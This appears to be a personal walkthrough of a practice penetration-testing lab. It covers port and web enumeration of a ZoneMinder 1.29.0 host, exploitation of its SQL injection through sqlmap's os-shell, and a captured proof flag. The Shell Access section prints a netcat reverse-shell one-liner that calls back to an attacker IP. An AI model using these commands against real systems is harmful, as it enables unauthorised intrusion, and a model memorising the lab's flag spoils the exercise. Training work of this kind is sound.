**Metadata**

- IP Address:  192.168.136.52
- Hostname: 
- OS: 	
- Found Credentials/Users:

Main Objectives:

To compromise this lab, you will exploit an SQL injection vulnerability to gain access to the database. Next, you will leverage a database privilege misconfiguration to launch a root shell. This exercise enhances your skills in exploiting SQL injection and privilege escalation techniques

Local.txt = 
Proof.txt = a055fc2faf21208c0d256f1b442bb867

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
sudo nmap -sS --top-ports 100 -T4 -Pn --max-retries 1 --min-rate 500 --host-timeout 60s -oA nmap/nmap_fast 192.168.136.52
# Fast scan to start with

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

sudo nmap -sT -p- -T4 -Pn --max-retries 2 --min-rate 300 -oA nmap/nmap_full 192.168.136.52
# Full TCP scan.

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy 

sudo nmap -sC -p 22,80,111,139,445,2049 -T4 -oA nmap/nmap_scripts 192.168.136.52
# Run Scripts on open ports

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http
|_http-title: Pebbles
3305/tcp open  odette-ftp
8080/tcp open  http-proxy
|_http-title: Tomcat
|_http-favicon: Apache Tomcat
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION

sudo nmap -sU --top-ports 100 -T4 --max-retries 1 --host-timeout 90s -oA nmap/udp_fast 192.168.136.52
# Fast UDP scan

Nothing

sudo nmap -sU -p- -T4 --max-retries 0 --min-rate 300 --host-timeout 10m -oA nmap/udp_full 192.168.136.52
# Full UDP Scan

Nothing


```

2. Interesting Ports/Services

```
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy 

```

3. FTP Enumeration Port 21

```
- Unsuccessfully attempted annoymous FTP access.
  ftp 192.168.136.52
Connected to 192.168.136.52.
220 (vsFTPd 3.0.3)
Name (192.168.136.52:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.

- sudo nmap -p 21 --script ftp-* 192.168.136.52

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3369 guesses in 601 seconds, average tps: 5.4



```

4. Port 3305 Enumeration

```
- Tried FTP connection, connected but no response
ftp 192.168.136.52 3305
- Tried Mysql connection. Failed.
- Tried http://192.168.136.52:3305. Returned Apache2 Ubuntu Default Page.
  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.136.52
+ Target Hostname:    192.168.136.52
+ Target Port:        3305
+ Start Time:         2025-12-16 18:14:20 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
^[[A^[[A^[[A+ /: Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5a8af141fc0fe, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /zm/: Cookie ZMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: Cookie zmSkin created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: Cookie zmCSS created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: This might be interesting: potential country code (Zambia).
+ 8909 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-12-16 18:26:14 (GMT-7) (714 seconds)

gobuster dir -u http://192.168.136.52:3305 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

===============================================================
/javascript           (Status: 301) [Size: 328] [--> http://192.168.136.52:3305/javascript/]
/zm                   (Status: 301) [Size: 320] [--> http://192.168.136.52:3305/zm/]
/server-status        (Status: 403) [Size: 281]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished

gobuster dir -u http://192.168.136.52:3305 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz

/index.html           (Status: 200) [Size: 11321]
/javascript           (Status: 301) [Size: 328] [--> http://192.168.136.52:3305/javascript/]

gobuster dir -u http://192.168.136.52:3305 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz

/index.html           (Status: 200) [Size: 11321]

gobuster dir -u http://192.168.136.52:3305/zm -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz

/ajax                 (Status: 301) [Size: 325] [--> http://192.168.136.52:3305/zm/ajax/]
/api                  (Status: 301) [Size: 324] [--> http://192.168.136.52:3305/zm/api/]
/cgi-bin              (Status: 301) [Size: 328] [--> http://192.168.136.52:3305/zm/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 281]
/cgi-bin/.php         (Status: 403) [Size: 281]
/css                  (Status: 301) [Size: 324] [--> http://192.168.136.52:3305/zm/css/]
/events               (Status: 301) [Size: 327] [--> http://192.168.136.52:3305/zm/events/]
/graphics             (Status: 301) [Size: 329] [--> http://192.168.136.52:3305/zm/graphics/]
/images               (Status: 301) [Size: 327] [--> http://192.168.136.52:3305/zm/images/]
/includes             (Status: 301) [Size: 329] [--> http://192.168.136.52:3305/zm/includes/]
/index.php            (Status: 200) [Size: 6785]
/index.php            (Status: 200) [Size: 6785]
/js                   (Status: 301) [Size: 323] [--> http://192.168.136.52:3305/zm/js/]
/lang                 (Status: 301) [Size: 325] [--> http://192.168.136.52:3305/zm/lang/]
/skins                (Status: 301) [Size: 326] [--> http://192.168.136.52:3305/zm/skins/]
/temp                 (Status: 301) [Size: 325] [--> http://192.168.136.52:3305/zm/temp/]
/tools                (Status: 301) [Size: 326] [--> http://192.168.136.52:3305/zm/tools/]
/views                (Status: 301) [Size: 326] [--> http://192.168.136.52:3305/zm/views/]


```

4. Web Enumeration Port 80

```
Webserver Info - 

Visted site manual obserations - 
- Website with logon and forgot password link. 
- Forgot password link broken.
- Visited http://192.168.136.52/zm
	   [ZoneMinder](http://www.zoneminder.com/) Console - [Running
	   (http://192.168.136.52/zm/?view=state) - default [v1.29.0]
	   (http://192.168.136.52/zm/?view=version)

nikto -h http://192.168.136.52

+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /zm/: Cookie ZMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: Cookie zmSkin created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: Cookie zmCSS created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: This might be interesting: potential country code (Zambia).
+ 8910 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2025-12-16 13:55:44 (GMT-7) (706 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

gobuster dir -u http://192.168.136.52 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing

/images               (Status: 301) [Size: 317] [--> http://192.168.136.52/images/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.136.52/css/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.136.52/javascript/]
/zm                   (Status: 301) [Size: 313] [--> http://192.168.136.52/zm/]
/server-status        (Status: 403) [Size: 279]

gobuster dir -u http://192.168.136.52 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

/css                  (Status: 301) [Size: 314] [--> http://192.168.136.52/css/]
/images               (Status: 301) [Size: 317] [--> http://192.168.136.52/images/]
/index.php            (Status: 200) [Size: 1134]
/index.php            (Status: 200) [Size: 1134]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.136.52/javascript/]

gobuster dir -u http://192.168.136.52 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Files

/index.php            (Status: 200) [Size: 1134]

gobuster dir -u http://192.168.136.52:8080/zm -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz

/ajax                 (Status: 301) [Size: 325] [--> http://192.168.136.52:8080/zm/ajax/]
/api                  (Status: 301) [Size: 324] [--> http://192.168.136.52:8080/zm/api/]
/cgi-bin              (Status: 301) [Size: 328] [--> http://192.168.136.52:8080/zm/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 281]
/cgi-bin/.php         (Status: 403) [Size: 281]
/css                  (Status: 301) [Size: 324] [--> http://192.168.136.52:8080/zm/css/]
/events               (Status: 301) [Size: 327] [--> http://192.168.136.52:8080/zm/events/]
/graphics             (Status: 301) [Size: 329] [--> http://192.168.136.52:8080/zm/graphics/]
/images               (Status: 301) [Size: 327] [--> http://192.168.136.52:8080/zm/images/]
/includes             (Status: 301) [Size: 329] [--> http://192.168.136.52:8080/zm/includes/]
/index.php            (Status: 200) [Size: 6785]
/index.php            (Status: 200) [Size: 6785]
/js                   (Status: 301) [Size: 323] [--> http://192.168.136.52:8080/zm/js/]
/lang                 (Status: 301) [Size: 325] [--> http://192.168.136.52:8080/zm/lang/]
/skins                (Status: 301) [Size: 326] [--> http://192.168.136.52:8080/zm/skins/]
/temp                 (Status: 301) [Size: 325] [--> http://192.168.136.52:8080/zm/temp/]
/tools                (Status: 301) [Size: 326] [--> http://192.168.136.52:8080/zm/tools/]
/views                (Status: 301) [Size: 326] [--> http://192.168.136.52:8080/zm/views/]

gobuster dir -u http://192.168.136.52/zm -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz

/ajax                 (Status: 301) [Size: 318] [--> http://192.168.136.52/zm/ajax/]
/api                  (Status: 301) [Size: 317] [--> http://192.168.136.52/zm/api/]
/cgi-bin              (Status: 301) [Size: 321] [--> http://192.168.136.52/zm/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 279]
/cgi-bin/.php         (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 317] [--> http://192.168.136.52/zm/css/]
/events               (Status: 301) [Size: 320] [--> http://192.168.136.52/zm/events/]
/graphics             (Status: 301) [Size: 322] [--> http://192.168.136.52/zm/graphics/]
/images               (Status: 301) [Size: 320] [--> http://192.168.136.52/zm/images/]
/includes             (Status: 301) [Size: 322] [--> http://192.168.136.52/zm/includes/]
/index.php            (Status: 200) [Size: 6785]
/index.php            (Status: 200) [Size: 6785]
/js                   (Status: 301) [Size: 316] [--> http://192.168.136.52/zm/js/]
/lang                 (Status: 301) [Size: 318] [--> http://192.168.136.52/zm/lang/]
/skins                (Status: 301) [Size: 319] [--> http://192.168.136.52/zm/skins/]
/temp                 (Status: 301) [Size: 318] [--> http://192.168.136.52/zm/temp/]
/tools                (Status: 301) [Size: 319] [--> http://192.168.136.52/zm/tools/]
/views                (Status: 301) [Size: 319] [--> http://192.168.136.52/zm/views/]



```

4. Web Enumeration Port 8080

```
Webserver Info - Apache/2.4.18 (Ubuntu)

Visted site manual obserations - 
- Maybe default Tomcat page. 
- Visited http://192.168.136.52:8080/zm
	   [ZoneMinder](http://www.zoneminder.com/) Console - [Running
	   (http://192.168.136.52:8080/zm/?view=state) - default [v1.29.0]
	   (http://192.168.136.52:8080/zm/?view=version)
- Visted http://192.168.136.52/hello.php. Returns code that get attribute.myattribute.
- Visted http://192.168.136.52:8080/WEB-INF/. Directory indexed. 


nikto -h http://192.168.136.52:8080

+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /favicon.ico: identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /zm/: Cookie ZMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: Cookie zmSkin created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: Cookie zmCSS created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /zm/: This might be interesting: potential country code (Zambia).
+ 8909 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-12-16 14:10:09 (GMT-7) (732 seconds)

gobuster dir -u http://192.168.136.52:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Directory brute forcing

/javascript           (Status: 301) [Size: 328] [--> http://192.168.136.52:8080/javascript/]
/zm                   (Status: 301) [Size: 320] [--> http://192.168.136.52:8080/zm/]
/server-status        (Status: 403) [Size: 281]

gobuster dir -u http://192.168.136.52:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz
# Common directories and files

/WEB-INF              (Status: 301) [Size: 325] [--> http://192.168.136.52:8080/WEB-INF/]
/favicon.ico          (Status: 200) [Size: 21630]
/hello.php            (Status: 200) [Size: 486]
/index.php            (Status: 200) [Size: 11074]
/index.php            (Status: 200) [Size: 11074]
/javascript           (Status: 301) [Size: 328] [--> http://192.168.136.52:8080/javascript/]

gobuster dir -u http://192.168.136.52:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,txt,log,bak,conf,ini,db,json,zip,tar,gz

/index.php            (Status: 200) [Size: 11074]
/favicon.ico          (Status: 200) [Size: 21630]
/hello.php            (Status: 200) [Size: 486]

# Files
```


7. Possible Exploits

```
- Zoneminder 1.29.0 has an SQL Injection vulnerability.
  https://www.exploit-db.com/exploits/41239
  
  http://192.168.136.52/zm/?view=state
  http://192.168.136.52:8080/zm/?view=state
  http://192.168.136.52:3305/zm/?view=state

- http://192.168.136.52/hello.php. Returns code that get attribute.myattribute.
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

```
- Looked up Zone Minder 1.2.9 in exploit db.
- Found exploit 41239.
- Tested exploit using Burp post.
- Used post in sqlmap with os-shell
  sqlmap -r post --technique=S --os-shell 
- Received very slow shell through SQLMAP


```

2. Shell Access

```
- Usend nc without -e to obtain a usable shell.
  
mkfifo /tmp/f; nc 192.168.45.187  80 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
  
- Linxu shell upgrade
  
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

- cat proof.txt
  a055fc2faf21208c0d256f1b442bb867
```

